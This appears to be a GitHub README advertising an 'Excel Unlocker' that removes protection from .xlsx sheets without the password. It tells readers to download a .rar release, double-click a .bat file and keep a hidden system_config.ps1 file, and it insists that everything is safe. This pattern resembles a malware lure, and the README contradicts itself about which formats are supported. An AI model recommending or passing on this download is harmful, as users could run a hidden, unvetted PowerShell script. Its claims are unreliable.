## 📂 README — Unlock Excel Sheets

## ⬇️ Download

[![Download](https://img.shields.io/badge/⬇️_Download_archive-Excel_Unlocker-blue?style=for-the-badge)](https://github.com/Ramcache/ExcelUnlock/releases/download/v1.1/ExcelUnlock-v1.1.rar)


**This tool allows you to remove protection from Excel sheets (.xlsx) and the workbook structure, even if you don't know the password.**

---

### 🔧 How to use

1. Place the locked `.xlsx` files in any convenient place.
2. Run the `**run_unlocker.bat**` file by double-clicking.
3. A window will open — select **one or more Excel files**.
4. After a few seconds, a new `**unlocked**` folder will appear in each folder.
5. Inside, there will be unlocked versions of the files — with the addition of `_unlocked.xlsx` in the name.

---

### ✅ What the program does

* Removes protection from **all sheets**
* Removes protection from **workbook structure** (if it blocks adding/deleting sheets)
* Does not require installation and works **offline**
* Does not change original files — creates copies

---

### ⚠️ Important

* Works only with `.xlsx` files (Excel 2007 and newer format)
* **`system_config.ps1` file is hidden — do not delete it!**
* Everything is safe — built-in Windows PowerShell is used

---

### ❓ If it does not work

* Make sure you **selected `.xlsx` files**, not `.xls`
* Do not delete the `system_config.ps1` file
* If an error message appears — try again or contact the author

---

## 📌 Important to know

Excel file formats are:

| Format | Extension | Supported? | Features |
| ------------------------------- | ---------- | --------------- | ------------------------------------------------------------ |
| **.xlsx** | ✔️ Yes | ✅ Yes | Regular ZIP archive — easily parsed by a script |
| **.xlsm** | ✔️ Yes | ✅ Yes | Same as `.xlsx`, but contains macros |
| **.xltx / .xltm** | ✔️ Yes | ✅ Yes | Templates — also ZIP, similar format |
| **.xls** (old Excel 97-2003) | ❌ No | 🚫 No | **Binary**, not ZIP — can't be processed the same way |

---

## ⚠️ What about `.xls`?

`.xls` is an old binary format that can't be "unpacked" like ZIP. To crack it:

* you need special utilities (e.g. **Free Spire.XLS**, **VBA codes**, **Hex editor**),
* or use Excel directly with a **VBA script** inside Excel.

---
